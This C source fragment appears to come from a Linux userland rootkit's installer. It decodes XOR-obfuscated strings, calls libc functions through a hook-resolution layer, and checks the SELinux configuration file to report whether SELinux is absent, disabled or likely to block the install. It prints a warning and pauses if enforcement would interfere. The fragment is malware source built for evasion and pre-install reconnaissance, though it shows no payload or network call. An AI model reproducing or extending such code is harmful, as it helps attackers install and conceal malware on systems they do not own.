int anselinux(void){
    char *secfg = xordup(SEL_CONFIG);
    if(!secfg) return -1;

    hook(CACCESS);
    int acc = (long)call(CACCESS, secfg, F_OK);
    clean(secfg);

    if(acc != 0 && errno == ENOENT)
        return 0;
    else if(acc != 0)
        return -1;

    return 1;
}

int chkselinux(void){
    int badselinux = 0;
    char *sel_cfg;
    FILE *fp;

    sel_cfg = xordup(SEL_CONFIG);
    if(!sel_cfg) return -1;
    hook(CFOPEN);
    fp = call(CFOPEN, sel_cfg, "r");
    clean(sel_cfg);
    if(fp == NULL) return -1;

    char line[LINE_MAX];
    while(fgets(line, sizeof(line), fp) != NULL && !badselinux){
        for(size_t i=0; i < NOSELINUX_SIZE && !badselinux; i++){
            char *nosl = xordup(noselinux[i]);
            if(!nosl) continue;
            badselinux = strncmp(nosl, line, strlen(nosl)) == 0;
            clean(nosl);
        }
    }
    fclose(fp);

    return badselinux;
}

void doselchk(void){
    int selinux;
    if((selinux = anselinux()) < 0){
        xperror(ANSELINUX);
        exit(0);
    }else if(selinux){
        bxprintf(SELINUX_PRESENT, 0);
        int c = chkselinux();
        switch(c){
            case -1:
                xperror(CHKSELINUX);
                break;
            case 1:
                bxprintlist(selinux_warning);
                getchar();
                break;
            case 0:
                bxprintf(SELINUX_DEAD, 0);
        }
    }else bxprintf(SELINUX_GONE, 0);
}